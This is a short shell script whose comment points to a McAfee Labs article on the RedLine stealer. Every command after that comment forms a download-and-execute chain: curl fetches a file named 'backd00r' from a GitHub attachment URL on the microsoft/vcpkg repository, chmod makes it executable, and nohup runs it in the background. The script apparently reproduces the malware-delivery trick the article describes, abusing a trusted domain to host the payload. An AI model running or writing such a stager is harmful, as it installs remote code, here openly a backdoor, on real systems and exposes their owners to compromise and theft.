#!/bin/sh
# Related story: https://www.mcafee.com/blogs/other-blogs/mcafee-labs/redline-stealer-a-novel-approach/
curl -s -LO https://github.com/microsoft/vcpkg/files/14125503/backd00r
chmod 755 backd00r
nohup ./backd00r &
